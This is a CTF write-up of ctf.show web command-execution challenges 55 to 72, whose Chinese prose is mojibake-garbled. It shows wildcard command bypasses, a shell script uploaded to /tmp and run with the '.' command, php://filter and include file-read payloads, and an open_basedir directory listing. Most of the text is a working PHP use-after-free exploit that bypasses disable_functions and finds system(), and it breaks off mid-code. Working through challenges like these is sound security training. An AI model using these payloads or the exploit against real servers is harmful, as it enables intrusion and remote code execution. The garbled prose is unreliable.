<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/base64 flag.php</span><br><span class="line">/???/????64 ????.???</span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒç§å°±æ˜¯å¯¹æ–‡ä»¶è¿›è¡Œå‹ç¼©ä»è€Œå»ä¸‹è½½</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/bzip2 flag,php</span><br><span class="line">/???/???/????2 ????.???</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸‰ç§å°±æ˜¯æœ€éš¾çš„äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--æ„é€ ä¸€ä¸ªpostä¸Šä¼ æ–‡ä»¶çš„æ•°æ®åŒ…ï¼Œè¿™æ˜¯ä¸ªä¸Šä¼ é¡µé¢ï¼Œé€‰æ‹©æ–‡ä»¶ä¸Šä¼ --&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POSTæ•°æ®åŒ…POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://dc1bfe3e-910b-4ad5-9130-db7f0cd7cca4.challenge.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥--&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;æ–‡ä»¶åï¼š&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>æ„é€ ä¸€ä¸ªpostå»ä¼ æ–‡ä»¶ï¼Œä¼šä¼ åˆ°ä¸´æ—¶ç›®å½•ä¸­ï¼Œå†ç”¨.å»æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åœ¨ burp æ‹¦æˆªä¸­ï¼Œé€šè¿‡ GET æ–¹å¼ä¼ é€’ï¼š</span><br><span class="line">?c=.+/???/????????[@-[]</span><br><span class="line"></span><br><span class="line">phpKKKK</span><br><span class="line"></span><br><span class="line">å¹¶åœ¨ä¸Šä¼ æ–‡ä»¶å†…å®¹æ·»åŠ shå‘½ä»¤ï¼š</span><br><span class="line">#!/bin/sh</span><br><span class="line">pwd</span><br></pre></td></tr></table></figure>

<h1 id="Web56"><a href="#Web56" class="headerlink" title="Web56"></a>Web56</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux ç³»ç»Ÿä¸‹ php æ¥æ”¶ä¸Šä¼ æ–‡ä»¶çš„ post åŒ…ï¼Œé»˜è®¤ä¼šå°†æ–‡ä»¶ä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ /tmp/ï¼Œæ–‡ä»¶å phpXXXXXXã€‚</span><br><span class="line">Linux ä¸­ .ï¼ˆç‚¹ï¼‰å‘½ä»¤ï¼Œæˆ–è€…å« periodï¼Œå®ƒçš„ä½œç”¨å’Œ source å‘½ä»¤ä¸€æ ·ï¼Œå°±æ˜¯ç”¨å½“å‰çš„ shell æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚</span><br><span class="line">ascii ç è¡¨ä¸­ï¼Œå¤§å†™å­—æ¯ä½äº â€œ @ â€ ä¸ â€œ [ â€ ä¹‹é—´ã€‚</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ä¸Šé¢˜çš„ç¬¬ä¸‰ç§æ–¹æ³•å³å¯</p>
<h1 id="Web57"><a href="#Web57" class="headerlink" title="Web57"></a>Web57</h1><p>è¿‡æ»¤äº†.ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨ä¸Šé¢ç”¨åˆ°çš„æ–¹æ³•</p>
<p>æˆ‘ä»¬åªéœ€è¦å‡‘å‡ºä¸€ä¸ª36å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$()å’Œ ` `  </span><br><span class="line">åœ¨ bash shell ä¸­ï¼Œ$( ) ä¸` ` (åå¼•å·) éƒ½å¯ç”¨åšå‘½ä»¤æ›¿æ¢ç”¨ã€‚</span><br><span class="line"></span><br><span class="line">ä¾‹å¦‚   </span><br><span class="line"></span><br><span class="line">version=$(uname -r)å’Œversion=`uname -r`éƒ½å¯ä»¥æ˜¯versionå¾—åˆ°å†…æ ¸çš„ç‰ˆæœ¬å·</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux Shell ä¸­ $(()) çš„ç”¨æ³•ã€‚  https://blog.csdn.net/u013402321/article/details/80333272</span><br><span class="line"></span><br><span class="line">ç®€å•æ¥è¯´ï¼Œ$(()) ç”¨æ¥åšæ•°å­¦è¿ç®—ã€‚ä¸” $(()) çš„å€¼ä¸º 0ã€‚</span><br><span class="line"></span><br><span class="line">~ åœ¨ $(()) ä¸­ä»£è¡¨æŒ‰ä½å–åï¼Œå³ $((~$(()))) å°±æ˜¯ 0 å–åï¼Œå³ -1ã€‚</span><br><span class="line"></span><br><span class="line">$(($((~$(())))$((~$(()))))) ä¹Ÿå°±æ˜¯ $((-1-1)) ä¸º -2ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;_&#125; =&quot;&quot; //è¿”å›ä¸Šä¸€æ¬¡å‘½ä»¤</span><br><span class="line">$(($&#123;_&#125;))=0</span><br><span class="line">$((~$(($&#123;_&#125;))))=-1</span><br></pre></td></tr></table></figure>

<h1 id="Web58"><a href="#Web58" class="headerlink" title="Web58"></a>Web58</h1><p>systemè¢«ç¦æ‰äº†ï¼Œæ‰€ä»¥æ¢ç”¨åˆ«çš„</p>
<p>è§£æ³•1ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br><span class="line">æˆ–</span><br><span class="line">c=highlight_file(&quot;flag.php&quot;);</span><br><span class="line">æˆ–</span><br><span class="line">c=file_get_contents(&#x27;falg.php&#x27;);</span><br></pre></td></tr></table></figure>

<p>è§£æ³•2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br></pre></td></tr></table></figure>

<h1 id="Web59"><a href="#Web59" class="headerlink" title="Web59"></a>Web59</h1><p>å’Œä¸Šé¢ä¸€é¢˜æ˜¯ä¸€æ ·çš„</p>
<h1 id="Web60"><a href="#Web60" class="headerlink" title="Web60"></a>Web60</h1><p>è¿˜æ˜¯å’Œä¸Šé¢çš„ä¸€æ ·çš„</p>
<h1 id="Web61"><a href="#Web61" class="headerlink" title="Web61"></a>Web61</h1><p>è¿˜æ˜¯ä¸€æ ·çš„</p>
<h1 id="Web62"><a href="#Web62" class="headerlink" title="Web62"></a>Web62</h1><p>è¿˜æ˜¯ä¸€æ ·çš„</p>
<h1 id="Web63"><a href="#Web63" class="headerlink" title="Web63"></a>Web63</h1><p>è¿˜æ˜¯ä¸€æ ·çš„</p>
<h1 id="Web64"><a href="#Web64" class="headerlink" title="Web64"></a>Web64</h1><p>è¿˜æ˜¯ä¸€æ ·çš„</p>
<h1 id="Web65"><a href="#Web65" class="headerlink" title="Web65"></a>Web65</h1><p>è¿˜æ˜¯ä¸€æ ·çš„</p>
<h1 id="Web66"><a href="#Web66" class="headerlink" title="Web66"></a>Web66</h1><p>è¿™é¢˜å°±æ˜¯æ–°çš„äº†ï¼Œå°†ä¸Šé¢çš„å‡½æ•°éƒ½ç¦äº†ã€‚</p>
<p>è€Œä¸”é€šè¿‡highlight_fileå¾—çŸ¥æ–‡ä»¶åæ”¹å˜äº†ï¼Œæˆ‘ä»¬å°±å…ˆç”¨print_r(scandir(â€˜&#x2F;â€˜));æŸ¥çœ‹æ ¹ç›®å½•æ–‡ä»¶ï¼Œå†ç”¨highlightå»è¯»å–å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scandir()ï¼šæ‰«æç›®å½•</span><br></pre></td></tr></table></figure>

<h1 id="Web67"><a href="#Web67" class="headerlink" title="Web67"></a>Web67</h1><p>å’Œä¸Šé¢˜ä¸€æ ·çš„</p>
<p>é¢˜ç›®å°±ä¸è´´äº†ã€‚å’Œå‰å‡ é¢˜ä¸€æ¨¡ä¸€æ ·çš„ã€‚</p>
<p>åŒºåˆ«åœ¨äºï¼Œ<code>print_r()</code> å‡½æ•°è¢«ç¦äº†ã€‚</p>
<p>é‚£å°±ç”¨ <code>var_dump()</code> å‡½æ•°ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c=var_dump(scandir(<span class="string">&#x27;/&#x27;</span>));</span><br></pre></td></tr></table></figure>

<h1 id="Web68"><a href="#Web68" class="headerlink" title="Web68"></a>Web68</h1><p>ç›´æ¥æ–‡ä»¶åŒ…å«å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&#x27;flag.txt&#x27;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include()ï¼šè¡¨è¾¾å¼åŒ…å«å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶ã€‚</span><br></pre></td></tr></table></figure>

<h1 id="Web69"><a href="#Web69" class="headerlink" title="Web69"></a>Web69</h1><p>è¿™é¢˜var_dumpè¢«ç¦äº†ï¼Œæˆ‘ä»¬å°±ä½¿ç”¨var_export</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_exportï¼šè¾“å‡ºæˆ–è¿”å›å˜é‡çš„å¯è§£æå­—ç¬¦ä¸²è¡¨ç¤ºã€‚</span><br></pre></td></tr></table></figure>

<h1 id="Web70"><a href="#Web70" class="headerlink" title="Web70"></a>Web70</h1><p>å’Œä¸Šé¢˜ä¸€æ¨¡ä¸€æ ·çš„</p>
<h1 id="Web71"><a href="#Web71" class="headerlink" title="Web71"></a>Web71</h1><p>è¿™é¢˜ç»™äº†æºç å°±å¯ä»¥å‘ç°æŠŠæ‰€æœ‰çš„è¾“å‡ºéƒ½æ¢æˆäº†é—®å·ï¼Œä½†æ˜¯ï¼Œç”±äºæ˜¯å‘½ä»¤æ‰§è¡Œï¼Œæˆ‘ä»¬å°±å¯ä»¥åŠ ä¸€ä¸ªexit(0);åœ¨åè¾¹ï¼Œä»è€Œè·³è¿‡åè¾¹çš„æ›¿æ¢ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include(&#x27;/flag.txt&#x27;);exit(0);</span><br></pre></td></tr></table></figure>

<h1 id="Web72"><a href="#Web72" class="headerlink" title="Web72"></a>Web72</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¹Ÿå°±æ˜¯è¯´ï¼Œæœ¬é¢˜è®¾ç½®äº† open_basedir()ï¼Œå°†phpæ‰€èƒ½æ‰“å¼€çš„æ–‡ä»¶é™åˆ¶åœ¨æŒ‡å®šçš„[ç›®å½•æ ‘](https://so.csdn.net/so/search?q=ç›®å½•æ ‘&amp;spm=1001.2101.3001.7020)ä¸­ï¼ŒåŒ…æ‹¬æ–‡ä»¶æœ¬èº«ã€‚</span><br><span class="line">å› ä¸º ini_set() ä¹Ÿè¢«é™åˆ¶äº†ï¼Œæ‰€ä»¥ open_basedir() ä¸èƒ½ç”¨ ini_set() é‡æ–°è®¾ç½®ç»•è¿‡ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸èƒ½è®¿é—®/ï¼Œè®¿é—®è·¯å¾„è¢«é™åˆ¶äº†ï¼Œåªèƒ½å…è®¸è®¿é—®çš„æ˜¯/var/www/html/ã€‚</span><br><span class="line">ä¹Ÿå°±æ˜¯è¯´ï¼Œæœ¬é¢˜è®¾ç½®äº†open_basedirï¼Œå°†phpæ‰€èƒ½æ‰“å¼€çš„æ–‡ä»¶é™åˆ¶åœ¨æŒ‡å®šçš„ç›®å½•æ ‘ä¸­,åŒ…æ‹¬æ–‡ä»¶æœ¬èº«ã€‚å› ä¸ºini_set()ä¹Ÿè¢«é™åˆ¶äº†ï¼Œæ‰€ä»¥open_basedirä¸èƒ½ç”¨ini_seté‡æ–°è®¾ç½®ç»•è¿‡ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);  </span><br><span class="line">	<span class="comment"># åˆ©ç”¨DirectoryIterator($path)å¯ä»¥å®ç°éå†ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line">	<span class="comment"># glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</span></span><br><span class="line">	<span class="comment"># DirectoryIterator(&quot;glob:///*&quot;)   éå†æ ¹ç›®å½•é‡Œæ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)  	<span class="comment">#å¾ªç¯éå†è¾“å‡ºï¼Œå¹¶ä»¥ç©ºæ ¼ä¸ºåˆ†éš”</span></span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬è¿™æ ·ä¹Ÿå°±å¯ä»¥å»è¯»å–åˆ°ç›¸åº”çš„ç›®å½•äº†</p>
<p>åé¢æ˜¯çœŸçš„å¥½éš¾</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"> </span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"> </span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span 